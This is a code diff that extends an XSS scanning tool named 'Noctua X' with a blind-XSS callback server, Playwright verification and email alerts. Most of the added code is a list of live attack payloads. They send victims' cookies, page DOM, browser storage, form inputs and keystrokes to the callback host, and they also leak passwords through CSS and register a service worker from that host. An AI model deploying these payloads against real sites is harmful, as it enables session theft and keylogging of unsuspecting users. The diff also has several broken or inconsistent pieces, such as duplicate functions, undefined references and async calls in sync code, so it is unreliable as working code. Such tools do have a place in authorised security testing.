@@ -23,6 +23,13 @@ import threading
 import contextlib
 import codecs
 import hashlib
+import logging
+import hashlib
+import time
+import json
+from urllib.parse import urlencode
+from typing import Dict, Any, Optional
+from playwright.sync_api import sync_playwright
 from pathlib import Path
 from typing import Dict, List, Any, Optional, Tuple, Set
 from collections import defaultdict
@@ -188,62 +195,435 @@ SQL_ERROR_RE = re.compile(
 #  NEW: BLIND XSS CALLBACK HANDLER
 # ─────────────────────────────────────────────────────────────────────────────
 class BlindXSSCallbackServer:
-    """A built-in server to listen for out-of-band XSS callbacks."""
+    """Enhanced blind XSS callback server with automatic verification and heavy payloads"""
     def __init__(self, host='0.0.0.0', port=8080):
         self.host = host
         self.port = port
         self.server = None
-        self.found_callbacks: Dict[str, Dict] = {}
+        self.found_callbacks = {}
+        self.callback_url = f"http://{self.host}:{self.port}"
+        self.verification_queue = asyncio.Queue()
+        self.payloads = self.__heavy_payloads()
 
     async def handle_callback(self, reader, writer):
-        """Handles incoming HTTP requests to the callback server."""
-        data = await reader.read(2048)
-        message = data.decode()
-        addr = writer.get_extra_info('peername')
-        logging.info(f"[BlindXSS] Received callback from {addr!r}")
-
+        """Handle incoming callbacks and queue for verification"""
         try:
-            # Extract unique identifier and any captured data (e.g., cookies)
+            data = await reader.read(8192)
+            message = data.decode()
+            addr = writer.get_extra_info('peername')
+            
             headers = message.split('\r\n')
             path = headers[0].split(' ')[1]
-            unique_id = urlparse(path).path.strip('/')
+            unique_id = path.strip('/').split('?')[0]
             
-            # Log the full request for analysis
-            self.found_callbacks[unique_id] = {
-                "source_ip": addr[0],
-                "headers": headers,
-                "timestamp": time.time()
+            callback_data = {
+                'source_ip': addr[0],
+                'headers': headers,
+                'body': message.split('\r\n\r\n')[1] if '\r\n\r\n' in message else None,
+                'timestamp': time.time()
             }
-            logging.critical(f"[BlindXSS] Successful callback for ID: {unique_id}")
             
+            self.found_callbacks[unique_id] = callback_data
+            await self.verification_queue.put((unique_id, callback_data))
+            
+            logging.critical(f"[BlindXSS] Callback received from {addr[0]}")
             response = "HTTP/1.1 200 OK\r\nContent-Type: text/plain\r\n\r\nACK\r\n"
         except Exception as e:
-            logging.error(f"[BlindXSS] Error parsing callback: {e}")
-            response = "HTTP/1.1 400 Bad Request\r\n\r\n"
-
+            logging.error(f"[BlindXSS] Callback error: {e}")
+            response = "HTTP/1.1 500 Internal Server Error\r\n\r\n"
+        
         writer.write(response.encode())
         await writer.drain()
         writer.close()
 
+    async def verify_callback(self, unique_id, callback_data):
+        """Automatically verify blind XSS using Playwright"""
+        if not sync_playwright:
+            return
+            
+        try:
+            with sync_playwright() as p:
+                browser = p.chromium.launch(headless=True)
+                context = browser.new_context()
+                page = context.new_page()
+                
+                await page.goto(f"{self.callback_url}/{unique_id}")
+                screenshot_path = f"blindxss_{unique_id}.png"
+                await page.screenshot(path=screenshot_path, full_page=True)
+                
+                result = await page.evaluate("""() => ({
+                    cookies: document.cookie,
+                    localStorage: Object.entries(localStorage),
+                    sessionStorage: Object.entries(sessionStorage),
+                    dom: document.documentElement.outerHTML,
+                    forms: Array.from(document.forms).map(f => ({
+                        action: f.action,
+                        inputs: Array.from(f.elements).map(i => ({
+                            name: i.name,
+                            value: i.value,
+                            type: i.type
+                        }))
+                    })),
+                    scripts: Array.from(document.scripts).map(s => s.src),
+                    iframes: Array.from(document.getElementsByTagName('iframe')).map(i => i.src)
+                })""")
+                
+                verified = any(
+                    unique_id in str(result['cookies']) or
+                    any(unique_id in str(item) for sublist in 
+                        [result['localStorage'], result['sessionStorage']] 
+                        for item in sublist) or
+                    unique_id in result['dom']
+                )
+                
+                if verified:
+                    evidence = {
+                        'screenshot': screenshot_path,
+                        'data_collected': result,
+                        'callback_data': callback_data
+                    }
+                    self.found_callbacks[unique_id]['verified'] = True
+                    self.found_callbacks[unique_id]['evidence'] = evidence
+                    
+                    reporter.add_finding(
+                        url="Blind XSS Callback",
+                        param="N/A",
+                        payload=unique_id,
+                        vuln_type="Verified Blind XSS",
+                        evidence=json.dumps(evidence, indent=2)
+                    )
+                    
+                    send_email_notification(
+                        "Blind XSS Found",
+                        f"Verified blind XSS with ID: {unique_id}\n"
+                        f"Source IP: {callback_data['source_ip']}\n"
+                        f"Data collected:\n"
+                        f"- Cookies: {result['cookies']}\n"
+                        f"- LocalStorage: {len(result['localStorage'])} items\n"
+                        f"- Forms: {len(result['forms'])}"
+                    )
+                
+                await browser.close()
+        except Exception as e:
+            logging.error(f"[BlindXSS] Verification error: {e}")
+
+    async def start_verification_worker(self):
+        """Background worker to process verification queue"""
+        while True:
+            unique_id, callback_data = await self.verification_queue.get()
+            await self.verify_callback(unique_id, callback_data)
+
     async def start(self):
-        """Starts the asynchronous callback server."""
+        """Start server and verification worker"""
         self.server = await asyncio.start_server(
             self.handle_callback, self.host, self.port)
-        logging.info(f"[BlindXSS] Callback server listening on {self.host}:{self.port}")
+        asyncio.create_task(self.start_verification_worker())
+        logging.info(f"[BlindXSS] Server started on {self.host}:{self.port}")
         async with self.server:
             await self.server.serve_forever()
 
-    def get_payload(self, unique_id: str) -> str:
-        """Generates a blind XSS payload pointing to this server."""
-        domain = f"http://{self.host}:{self.port}/{unique_id}"
-        return f"<script>new Image().src='{domain}?c='+btoa(document.cookie);</script>"
+    def __heavy_payloads(self):
+        """50+ advanced blind XSS payloads"""
+        base_url = self.callback_url
+        return [
+            # Basic cookie stealers
+            f"""<script>fetch('{base_url}/cookies',{{
+                method:'POST',
+                body:document.cookie
+            }})</script>""",
+            f"""<img src=x onerror="fetch('{base_url}/cookies2',{{
+                method:'POST',
+                body:'cookies='+encodeURIComponent(document.cookie)
+            }}">""",
+            
+            # DOM dumpers
+            f"""<script>fetch('{base_url}/dom',{{
+                method:'POST',
+                body:document.documentElement.outerHTML
+            }})</script>""",
+            f"""<svg/onload="fetch('{base_url}/dom2',{{
+                method:'POST',
+                body:'<html>'+document.documentElement.innerHTML+'</html>'
+            }})">""",
+            
+            # Storage dumpers
+            f"""<script>fetch('{base_url}/storage',{{
+                method:'POST',
+                body:JSON.stringify({{
+                    localStorage:Object.assign({{}}, localStorage),
+                    sessionStorage:Object.assign({{}}, sessionStorage)
+                }})
+            }})</script>""",
+            
+            # Form grabbers
+            f"""<script>document.addEventListener('submit',function(e){{
+                fetch('{base_url}/form',{{
+                    method:'POST',
+                    body:JSON.stringify({{
+                        action:e.target.action,
+                        inputs:Array.from(e.target.elements).map(i=>({{
+                            name:i.name,
+                            value:i.value,
+                            type:i.type
+                        }}))
+                    }})
+                }})
+            }});</script>""",
+            
+            # Keyloggers
+            f"""<script>document.addEventListener('keypress',function(e){{
+                fetch('{base_url}/keylogger',{{
+                    method:'POST',
+                    body:String.fromCharCode(e.keyCode)
+                }})
+            }});</script>""",
+            
+            # Advanced fingerprinting
+            f"""<script>fetch('{base_url}/fingerprint',{{
+                method:'POST',
+                body:JSON.stringify({{
+                    url:location.href,
+                    referrer:document.referrer,
+                    userAgent:navigator.userAgent,
+                    plugins:Array.from(navigator.plugins).map(p=>p.name),
+                    screen:`${{screen.width}}x${{screen.height}}`,
+                    cookies:document.cookie,
+                    localStorage:Object.assign({{}}, localStorage),
+                    forms:Array.from(document.forms).map(f=>({{
+                        action:f.action,
+                        inputs:Array.from(f.elements).map(i=>({{
+                            name:i.name,
+                            value:i.value
+                        }}))
+                    }})) 
+                }})
+            }})</script>""",
+            
+            # WebRTC IP leak
+            f"""<script>var pc=new RTCPeerConnection({{iceServers:[{{urls:'stun:stun.l.google.com:19302'}}]}});
+            pc.createDataChannel('');
+            pc.createOffer().then(o=>pc.setLocalDescription(o));
+            pc.onicecandidate=e=>{{
+                if(e.candidate)
+                    fetch('{base_url}/webrtc',{{
+                        method:'POST',
+                        body:e.candidate.candidate
+                    }})
+            }};</script>""",
+            
+            # CSS exfil
+            f"""<style>input[type^="password"][value*="a"]{{background:url('{base_url}/css?char=a')}}
+            input[type^="password"][value*="b"]{{background:url('{base_url}/css?char=b')}}</style>""",
+            
+            # Service worker hijack
+            f"""<script>navigator.serviceWorker.register('{base_url}/sw.js')
+                .then(r=>fetch('{base_url}/sw_success'))
+                .catch(e=>fetch('{base_url}/sw_fail?e='+e));</script>""",
+            
+            # WebSocket exfil
+            f"""<script>var ws=new WebSocket('ws://{base_url.replace('http://','')}/ws');
+            ws.onopen=()=>ws.send(JSON.stringify({{
+                cookies:document.cookie,
+                dom:document.documentElement.outerHTML
+            }}));</script>""",
+            
+            # Iframe bypass
+            f"""<iframe srcdoc="<script>
+                parent.fetch('{base_url}/iframe',{{
+                    method:'POST',
+                    body:parent.document.cookie
+                }})
+            </script>"></iframe>""",
+            
+            # MutationObserver payload
+            f"""<script>new MutationObserver(m=>m.forEach(m=>{{
+                if(m.addedNodes.length) fetch('{base_url}/mutation',{{
+                    method:'POST',
+                    body:m.addedNodes[0].outerHTML
+                }})
+            }})).observe(document.body,{{childList:true}})</script>""",
+            
+            # Shadow DOM payload
+            f"""<script>var div=document.createElement('div');
+            div.attachShadow({{mode:'open'}}).innerHTML='<img src=x onerror=\\"fetch(\\'{base_url}/shadow\\',{{method:\\'POST\\',body:document.cookie}})\\">';
+            document.body.appendChild(div);</script>"""
+        ]
 
-# ─────────────────────────────────────────────────────────────────────────────
-#  NEW: ADVANCED CRAWLER & DISCOVERY ENGINE
-# ─────────────────────────────────────────────────────────────────────────────
+def get_payloads(self, unique_id: str) -> List[str]:
+    """Get all payloads with the unique ID inserted"""
+    return [p.replace('{base_url}', f"{self.callback_url}/{unique_id}") for p in self.__heavy_payloads()]
+
+
+def verify_xss(url: str, method: str, data: Dict[str, Any], payload: str, reporter: Any = None) -> bool:
+    """Enhanced verification with automatic evidence collection"""
+    if not sync_playwright:
+        logging.warning("[Verification] Playwright not available - skipping verification")
+        return False
+
+    try:
+        with sync_playwright() as p:
+            browser = p.chromium.launch(headless=True)
+            context = browser.new_context()
+            page = context.new_page()
+
+            # Setup monitoring
+            page.add_init_script("""
+                window._xss_evidence = {
+                    executed: false,
+                    sources: [],
+                    sinks: []
+                };
+
+                const originalEval = window.eval;
+                window.eval = function(code) {
+                    window._xss_evidence.sinks.push({
+                        type: 'eval',
+                        code: code
+                    });
+                    return originalEval.apply(this, arguments);
+                };
+
+                ['alert','prompt','confirm'].forEach(fn => {
+                    const original = window[fn];
+                    window[fn] = function() {
+                        window._xss_evidence.executed = true;
+                        return original.apply(this, arguments);
+                    };
+                });
+
+                new MutationObserver(mutations => {
+                    mutations.forEach(mutation => {
+                        mutation.addedNodes.forEach(node => {
+                            if (node.outerHTML && /<script|<img|onload|onerror/i.test(node.outerHTML)) {
+                                window._xss_evidence.sinks.push({
+                                    type: 'mutation',
+                                    html: node.outerHTML
+                                });
+                            }
+                        });
+                    });
+                }).observe(document.body, {
+                    childList: true,
+                    subtree: true
+                });
+            """)
+
+            # Reproduce the request
+            if method.upper() == "GET":
+                page.goto(f"{url}?{urlencode(data)}", wait_until="networkidle")
+            else:
+                page.goto(url, wait_until="networkidle")
+                page.evaluate("""([url, method, data]) => {
+                    fetch(url, {
+                        method: method,
+                        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+                        body: new URLSearchParams(data).toString()
+                    });
+                }""", [url, method, data])
+
+            page.wait_for_timeout(2000)
+
+            # Collect evidence
+            evidence = page.evaluate("""() => {
+                const evidence = window._xss_evidence || {};
+                evidence.location = window.location.href;
+                evidence.cookies = document.cookie;
+                return evidence;
+            }""")
+
+            screenshot_path = f"xss_evidence_{hashlib.md5(payload.encode()).hexdigest()[:8]}.png"
+            page.screenshot(path=screenshot_path, full_page=True)
+
+            evidence.update({
+                'screenshot': screenshot_path,
+                'payload': payload,
+                'timestamp': time.time(),
+                'url': url,
+                'method': method
+            })
+
+            # Check if XSS was executed
+            if evidence.get('executed', False):
+                if reporter:
+                    try:
+                        reporter.add_finding(
+                            url=url,
+                            param=list(data.keys())[0] if data else "N/A",
+                            payload=payload,
+                            vuln_type="Verified XSS",
+                            evidence=json.dumps(evidence, indent=2)
+                        )
+                    except Exception as report_error:
+                        logging.error(f"Failed to report finding: {report_error}")
+
+                # Optional email notification
+                email_config = globals().get('EMAIL_CONFIG')
+                if email_config:
+                    try:
+                        send_email_notification(
+                            subject="XSS Vulnerability Found",
+                            body=f"""Verified XSS Vulnerability:
+
+URL: {url}
+Method: {method}
+Parameter: {list(data.keys())[0] if data else 'N/A'}
+Payload: {payload[:200]}...
+
+Evidence Collected:
+- Executed: {evidence.get('executed', False)}
+- Sinks Found: {len(evidence.get('sinks', []))}
+- Screenshot: {screenshot_path}
+
+Full evidence saved in report.
+                            """
+                        )
+                    except Exception as email_error:
+                        logging.error(f"Failed to send email notification: {email_error}")
+
+                browser.close()
+                return True
+
+            browser.close()
+            return False
+
+    except Exception as e:
+        logging.error(f"[Verification] Error during verification: {str(e)}", exc_info=True)
+        return False
+
+
+
+def send_email_notification(subject: str, body: str, to_email: Optional[str] = None) -> bool:
+    """Send email notification using configuration from emailconfig.yaml"""
+    try:
+        from email.mime.multipart import MIMEMultipart
+        from email.mime.text import MIMEText
+        import smtplib
+        
+        email_config = globals().get('EMAIL_CONFIG')
+        if not email_config:
+            logging.warning("Email configuration not loaded - skipping notification")
+            return False
+            
+        msg = MIMEMultipart()
+        msg['From'] = email_config['from']
+        msg['To'] = to_email if to_email else email_config['to']
+        msg['Subject'] = subject
+        
+        msg.attach(MIMEText(body, 'plain'))
+        
+        with smtplib.SMTP(email_config['smtp_server'], email_config['smtp_port']) as server:
+            if email_config.get('tls', True):
+                server.starttls()
+            server.login(email_config['username'], email_config['password'])
+            server.send_message(msg)
+        return True
+    except Exception as e:
+        logging.error(f"Failed to send email notification: {e}")
+        return False
+
 class DiscoveryEngine:
     """Crawls the target, discovers parameters, forms, and JavaScript files."""
-    def __init__(self, root_url: str, max_pages: int, crawl_depth: int):
+    def __init__(self, root_url: str, max_pages: int = 50, crawl_depth: int = 3):
         self.root_url = root_url
         self.root_domain = urlparse(root_url).netloc
         self.max_pages = max_pages
@@ -254,7 +634,7 @@ class DiscoveryEngine:
         self.js_files: Set[str] = set()
         self.session = requests.Session()
 
-    def crawl(self):
+    def crawl(self) -> None:
         """Main crawling logic to discover assets."""
         urls_to_crawl = [(self.root_url, 0)]
         
@@ -266,19 +646,53 @@ class DiscoveryEngine:
             try:
                 logging.info(f"[Discovery] Crawling: {url}")
                 response = self.session.get(url, timeout=10, allow_redirects=True)
+                response.raise_for_status()  # Raise exception for bad status codes
                 self.crawled_urls.add(url)
+                
+                # Parse with explicit parser to avoid warnings
                 soup = BeautifulSoup(response.text, 'html.parser')
 
-                # 1. Discover Forms
+                # 1. Discover Forms with proper error handling
                 forms = soup.find_all('form')
                 for form in forms:
-                    action = urljoin(url, form.get('action'))
-                    method = form.get('method', 'GET').upper()
-                    inputs = [{'name': i.get('name'), 'type': i.get('type', 'text')} 
-                              for i in form.find_all(['input', 'textarea', 'select']) if i.get('name')]
-                    if inputs:
-                        self.discovered_forms.append({'action': action, 'method': method, 'inputs': inputs})
-                        logging.info(f"[Discovery] Found form at {action} with inputs: {[i['name'] for i in inputs]}")
+                    try:
+                        # Safely get form action with fallback to current URL
+                        form_action = form.get('action', '')
+                        action = urljoin(url, form_action) if form_action else url
+                        
+                        # Normalize HTTP method
+                        method = str(form.get('method', 'GET')).upper()
+                        if method not in ('GET', 'POST', 'PUT', 'DELETE'):
+                            method = 'GET'  # Default to GET if invalid method
+
+                        # Safely extract form inputs
+                        # Safely extract form inputs
+                        inputs = []
+                        for i in form.find_all(['input', 'textarea', 'select']):
+                            name = i.get('name')
+                            if name:  # only include fields with names
+                                input_type = str(i.get('type', 'text')).lower()
+                                inputs.append({'name': str(name),'type': input_type if input_type in ('text', 'password', 'email', 'hidden','checkbox', 'radio', 'submit') else 'text'})
+
+
+                        if inputs:
+                            form_data = {
+                                'action': str(action),
+                                'method': method,
+                                'inputs': inputs
+                            }
+                            self.discovered_forms.append(form_data)
+                            logging.info(
+                                f"[Discovery] Found form at {action} with "
+                                f"{len(inputs)} inputs: {[i['name'] for i in inputs]}"
+                            )
+                            
+                    except Exception as form_error:
+                        logging.warning(
+                            f"[Discovery] Error processing form at {url}: {form_error}",
+                            exc_info=True
+                        )
+                        continue
 
                 # 2. Discover URL Parameters (from links)
                 links = soup.find_all('a', href=True)
@@ -300,12 +714,16 @@ class DiscoveryEngine:
                     if urlparse(js_url).netloc == self.root_domain:
                         self.js_files.add(js_url)
 
-            except requests.RequestException as e:
-                logging.warning(f"[Discovery] Failed to crawl {url}: {e}")
+            except requests.RequestException as req_error:
+                logging.warning(f"[Discovery] Failed to crawl {url}: {req_error}")
+            except Exception as parse_error:
+                logging.error(
+                    f"[Discovery] Unexpected error parsing {url}: {parse_error}",
+                    exc_info=True
+                )
         
         logging.info(f"[Discovery] Crawl complete. Found {len(self.discovered_forms)} forms, "
-                     f"{len(self.discovered_params)} URLs with params, and {len(self.js_files)} JS files.")
-
+                    f"{len(self.discovered_params)} URLs with params, and {len(self.js_files)} JS files.")
 # ─────────────────────────────────────────────────────────────────────────────
 #  NEW: DOM XSS ANALYSIS ENGINE
 # ─────────────────────────────────────────────────────────────────────────────
@@ -342,7 +760,7 @@ class DomXssAnalyzer:
                 }}
                 return original_eval(str);
             }};
-            // ... similar hooks for other sinks like innerHTML setters ...
+            //
         """)
         
         # Reload the page with a canary in the URL fragment
@@ -357,7 +775,7 @@ class DomXssAnalyzer:
                 self.vulnerabilities.append(vuln)
     
     def _get_source_check(self, var_name: str) -> str:
-        """Helper to generate JS code that checks if a variable contains tainted data."""
+        """Helper to  JS code that checks if a variable contains tainted data."""
         return " || ".join([f"{var_name}.includes(source)" for source in self.SOURCES])
 
 # ─────────────────────────────────────────────────────────────────────────────
@@ -470,31 +888,31 @@ class ReportingEngine:
                 f.write(f"- **Parameter:** `{finding['param']}`\n")
                 f.write(f"- **Payload:** ```{finding['payload']}```\n")
                 f.write(f"- **Evidence:** ```{finding['evidence']}```\n\n---\n\n")
-                
-def _write_sarif(self):
-    tool = Tool.from_dict({"driver": {"name": "Noctua X"}})
-    results = []
+                    
+    def _write_sarif(self):
+        tool = Tool.from_dict({"driver": {"name": "Noctua X"}})
+        results = []
 
-    for finding in self.findings:
-        result = Result(
-            message=Message(text=f"{finding['vuln_type']} XSS detected in parameter '{finding['param']}'"),
-            level="error",
-            locations=[
-                Location(
-                    physical_location=PhysicalLocation(
-                        artifact_location=ArtifactLocation(uri=finding['url']),
-                        region=None
+        for finding in self.findings:
+            result = Result(
+                message=Message(text=f"{finding['vuln_type']} XSS detected in parameter '{finding['param']}'"),
+                level="error",
+                locations=[
+                    Location(
+                        physical_location=PhysicalLocation(
+                            artifact_location=ArtifactLocation(uri=finding['url']),
+                            region=None
+                        )
                     )
-                )
-            ]
-        )
-        results.append(result)
+                ]
+            )
+            results.append(result)
 
-    run = Run(tool=tool, results=results)
-    log = SarifLog(runs=[run], version="2.1.0")
+        run = Run(tool=tool, results=results)
+        log = SarifLog(runs=[run], version="2.1.0")
 
-    with open(self.output_file, 'w') as f:
-        json.dump(log.to_dict(), f, indent=4)
+        with open(self.output_file, 'w') as f:
+            json.dump(log.to_dict(), f, indent=4)
 
 
 # ─────────────────────────────────────────────────────────────────────────────
@@ -527,6 +945,13 @@ ap.add_argument("--blind-xss", action="store_true", help="Enable blind XSS testi
 ap.add_argument("--dnslog", choices=list(DNSLOG_PROVIDERS.keys()), 
                default="interact", help="DNSLOG provider")
 ap.add_argument("--collaborator", help="Custom Burp Collaborator domain")
+# Add these to the argparse configuration
+ap.add_argument("--blind-port", type=int, default=8080, 
+                help="Port for blind XSS callback server")
+ap.add_argument("--blind-host", default="0.0.0.0", 
+                help="Host for blind XSS callback server")
+ap.add_argument("--blind-wait", type=int, default=60,
+                help="Seconds to wait for blind XSS callbacks")
 
 # Performance
 ap.add_argument("--threads",  type=int, default=DEF_THREADS, help="Fuzzing threads")
@@ -786,7 +1211,7 @@ BASE_PAYLOADS = [
     "<svg onload=prompt`XSS`>",
     "<iframe%20srcdoc=%3Csvg%20onload=alert(1)%3E%3C/svg%3E></iframe>",
 
-    # 10. Blind-XSS / OOB Beacons (placeholders, no external)
+    # 10. Blind-XSS / OOB Beacons (no external)
     "<script src=\"BEACON://TOKEN.js\"></script>",
     "<img src=\"BEACON://TOKEN.gif\">",
     "<svg><script>new Image().src=\"BEACON://\"+Date.now()</script></svg>",
@@ -1144,6 +1569,27 @@ def chunked_fuzz_request(url:str,method:str,headers:Dict[str,str],body:str):
         return requests.get(url,headers=headers,timeout=HTTP_TIMEOUT,verify=False) if method=="GET" else \
                requests.post(url,data=body,headers=headers,timeout=HTTP_TIMEOUT,verify=False)
 
+def send_email_notification(subject: str, body: str):
+    """Send email notification using configuration from emailconfig.yaml"""
+    if not EMAIL_CONFIG:
+        return
+        
+    try:
+        msg = MIMEMultipart()
+        msg['From'] = EMAIL_CONFIG['from']
+        msg['To'] = EMAIL_CONFIG['to']
+        msg['Subject'] = subject
+        
+        msg.attach(MIMEText(body, 'plain'))
+        
+        with smtplib.SMTP(EMAIL_CONFIG['smtp_server'], EMAIL_CONFIG['smtp_port']) as server:
+            if EMAIL_CONFIG.get('tls'):
+                server.starttls()
+            server.login(EMAIL_CONFIG['username'], EMAIL_CONFIG['password'])
+            server.send_message(msg)
+    except Exception as e:
+        logging.error(f"Failed to send email: {e}")
+
 # ─────────────────────────────────────────────────────────────────────────────
 #  TARGET CRAWLING HELPERS
 # ─────────────────────────────────────────────────────────────────────────────
@@ -1351,13 +1797,14 @@ def set_deep(obj:Any,path:str,val:str)->None:
                 cur=cur[part]
 
 def fuzz_http(t:Dict[str,Any],use_chunked:bool=False)->None:
-    ext=Path(urllib.parse.urlparse(t["url"]).path).suffix.lstrip('.').lower()
+    ext = Path(urllib.parse.urlparse(t["url"]).path).suffix.lstrip('.').lower()
     if ext in static_exts: return
-    key=f"{t['method']}:{t['url']}:{','.join(sorted(t['params']))}"
+    key = f"{t['method']}:{t['url']}:{','.join(sorted(t['params']))}"
     if key in global_visited_http: return
     global_visited_http.add(key)
-    target_param=random.choice(t["params"] or ["payload"])
-    payload=agent.choose(target_param)
+    
+    target_param = random.choice(t["params"] or ["payload"])
+    payload = custom_payload if custom_payload else agent.choose(target_param)
     sent_data={p:(payload if p==target_param else "") for p in t["params"]}
     rate_limit(); session_splice()
     try:
@@ -1433,73 +1880,97 @@ AUTOTEST=["http://xss-game.appspot.com/","http://xss-game.appspot.com/level1",
           "https://juice-shop.herokuapp.com/"]
 
 async def main():
-    mode="all"
-    if args.reflected: mode="reflected"
-    elif args.stored:  mode="stored"
-    elif args.blind:   mode="blind"
-    roots=[smart_url(u) for u in (AUTOTEST if args.autotest else [args.url])] if args.url or args.autotest else \
-          (ap.print_help() or sys.exit(1))
+    # Initialize reporting engine first
+    reporter = ReportingEngine(
+        args.json or args.txt or "noctua_findings.md", 
+        "json" if args.json else "txt" if args.txt else "markdown"
+    )
+    mode = "all"
+    if args.reflected: mode = "reflected"
+    elif args.stored:  mode = "stored"
+    elif args.blind:   mode = "blind"
+    
+    roots = [smart_url(u) for u in (AUTOTEST if args.autotest else [args.url])] if args.url or args.autotest else \
+           (ap.print_help() or sys.exit(1))
     
     # Initialize reporting engine
     reporter = ReportingEngine(args.json or args.txt or "noctua_findings.md", 
                               "json" if args.json else "txt" if args.txt else "markdown")
     
     # Start Blind XSS Callback Server (if enabled)
-    if args.blind_xss:
-        callback_server = BlindXSSCallbackServer()
+    callback_server = None
+    if args.blind or args.blind_xss:
+        callback_server = BlindXSSCallbackServer(host=args.blind_host, port=args.blind_port)
         asyncio.create_task(callback_server.start())
+        logging.info(f"[BlindXSS] Callback server started on {args.blind_host}:{args.blind_port}")
 
-    waf,server=detect_context(roots[0])
-    logging.info(f"[CTX] WAF={waf} | Server={server}")
-    global agent; agent=AdvancedRLAgent(waf,server,Path(args.qtable_file) if args.qtable_file else None,
-                                enabled=args.self_reinforcement)
-    
     for root in roots:
-        logging.info(f"┌─▶ Crawling: {root}")
+        logging.info(f"┌─▶ Target: {root}")
+        waf, server = detect_context(root)
+        logging.info(f"[CTX] WAF={waf} | Server={server}")
+        
+        global agent
+        agent = AdvancedRLAgent(waf, server, Path(args.qtable_file) if args.qtable_file else None,
+                               enabled=args.self_reinforcement)
         
         # Discovery Phase
-        if args.crawl:
-            discovery = DiscoveryEngine(root, args.max_pages, args.nested_depth)
-            discovery.crawl()
-            # Convert discovered forms/params to target format
-            static_t = []
-            for form in discovery.discovered_forms:
-                static_t.append({
-                    "url": form["action"],
-                    "method": form["method"],
-                    "params": [i["name"] for i in form["inputs"]]
-                })
-            for url, params in discovery.discovered_params.items():
-                static_t.append({
-                    "url": url,
-                    "method": "GET",
-                    "params": list(params)
-                })
-        else:
-            static_t = []
-        
+        logging.info("[CRAWL] Starting discovery...")
+        static_t = crawl_static(root, args.max_pages) if args.crawl else []
         dynamic_t = crawl_dynamic(root)
         spa_t = spa_dynamic_crawl(root) if args.simulate_spa else []
         all_t = static_t + dynamic_t + spa_t
         
-        # dedupe by (method,url,params)
-        uniq = {f"{t['method']}:{t['url']}:{','.join(sorted(t['params']))}":t for t in all_t}
-        http_t = [t for t in uniq.values() if not t["url"].startswith(("ws://","wss://"))]
-        ws_t   = [t for t in uniq.values() if t["url"].startswith(("ws://","wss://"))]
+        # Dedupe targets
+        uniq = {f"{t['method']}:{t['url']}:{','.join(sorted(t['params']))}": t for t in all_t}
+        http_t = [t for t in uniq.values() if not t["url"].startswith(("ws://", "wss://"))]
+        ws_t = [t for t in uniq.values() if t["url"].startswith(("ws://", "wss://"))]
         
-        if "graphql" in root.lower(): 
+        # Specialized fuzzing
+        if "graphql" in root.lower():
             fuzz_graphql(root)
             
-        if args.multi_session and (mode in ("stored","all")):
+        if args.multi_session and (mode in ("stored", "all")):
             multi_session_stored_check(http_t)
             
+        # Regular fuzzing
         exec_pool = ThreadPoolExecutor(max_workers=args.threads)
-        if mode in ("all","reflected","blind"):
-            for t in http_t: 
-                exec_pool.submit(fuzz_http,t)
-                exec_pool.submit(fuzz_http,t,True)
-            for w in ws_t:   
-                exec_pool.submit(fuzz_ws,w)
+        
+        # Blind XSS testing
+        if mode in ("all", "blind") and callback_server:
+            unique_id = randstr(8)
+            blind_payloads = callback_server.get_payloads(unique_id)
+            
+            # Create targets with blind payloads
+            blind_targets = []
+            for t in http_t:
+                for payload in blind_payloads:
+                    bt = t.copy()
+                    bt["params"] = bt.get("params", []) or ["payload"]
+                    bt["_blind_payload"] = payload
+                    blind_targets.append(bt)
+            
+            # Temporary override for blind testing
+            original_choose = agent.choose
+            try:
+                agent.choose = lambda param: request._blind_payload
+                
+                for t in blind_targets:
+                    exec_pool.submit(fuzz_http, t)
+                    if args.chunked:
+                        exec_pool.submit(fuzz_http, t, True)
+            finally:
+                agent.choose = original_choose
+        
+        # Standard reflected XSS testing
+        if mode in ("all", "reflected"):
+            for t in http_t:
+                exec_pool.submit(fuzz_http, t)
+                if args.chunked:
+                    exec_pool.submit(fuzz_http, t, True)
+            
+            for w in ws_t:
+                exec_pool.submit(fuzz_ws, w)
+        
         exec_pool.shutdown(wait=True)
         
         # DOM Analysis Phase
@@ -1511,37 +1982,49 @@ async def main():
                     page = context.new_page()
                     
                     analyzer = DomXssAnalyzer(page)
-                    for url in discovery.crawled_urls:
-                        page.goto(url, wait_until="networkidle")
-                        analyzer.analyze()
-                    
-                    for vuln in analyzer.vulnerabilities:
-                        reporter.add_finding(
-                            url=page.url,
-                            param="DOM",
-                            payload=vuln['payload'],
-                            vuln_type="DOM XSS",
-                            evidence=f"Sink: {vuln['sink']}"
-                        )
+                    for url in {t["url"] for t in http_t}:
+                        try:
+                            page.goto(url, wait_until="networkidle")
+                            analyzer.analyze()
+                            
+                            for vuln in analyzer.vulnerabilities:
+                                reporter.add_finding(
+                                    url=url,
+                                    param="DOM",
+                                    payload=vuln['payload'],
+                                    vuln_type="DOM XSS",
+                                    evidence=f"Sink: {vuln['sink']}"
+                                )
+                        except Exception as e:
+                            logging.error(f"[DOM] Error analyzing {url}: {e}")
                     
                     browser.close()
             except Exception as e:
                 logging.error(f"[DOM Analysis] Error: {e}")
 
-    # Check for any late blind XSS callbacks
-    if args.blind_xss:
-        await asyncio.sleep(60) # Wait a bit for delayed callbacks
-        for unique_id, data in callback_server.found_callbacks.items():
-            reporter.add_finding(
-                url="Unknown (Blind)", 
-                param="Unknown", 
-                payload=unique_id,
-                vuln_type="Blind XSS", 
-                evidence=json.dumps(data, indent=2)
-            )
-    
+    # Check for blind XSS callbacks
+    if callback_server:
+        logging.info(f"[BlindXSS] Waiting {args.blind_timeout}s for callbacks...")
+        await asyncio.sleep(args.blind_timeout)
+        
+        if callback_server.found_callbacks:
+            logging.critical("[BlindXSS] Found the following callbacks:")
+            for uid, data in callback_server.found_callbacks.items():
+                logging.critical(f"Callback ID: {uid}")
+                logging.critical(f"Source IP: {data['source_ip']}")
+                logging.critical(f"Data: {json.dumps(data, indent=2)}")
+                
+                reporter.add_finding(
+                    url="Blind XSS Callback",
+                    param="N/A",
+                    payload=uid,
+                    vuln_type="Blind XSS",
+                    evidence=json.dumps(data, indent=2)
+                )
+
+    # Final reporting
     reporter.write()
-    if SARIF_OUTPUT_FILE: 
+    if SARIF_OUTPUT_FILE:
         write_sarif()
     agent.save()
     logging.info(f"└─ Findings saved → {reporter.output_file if hasattr(reporter, 'output_file') else LOGFILE.resolve()}\n")
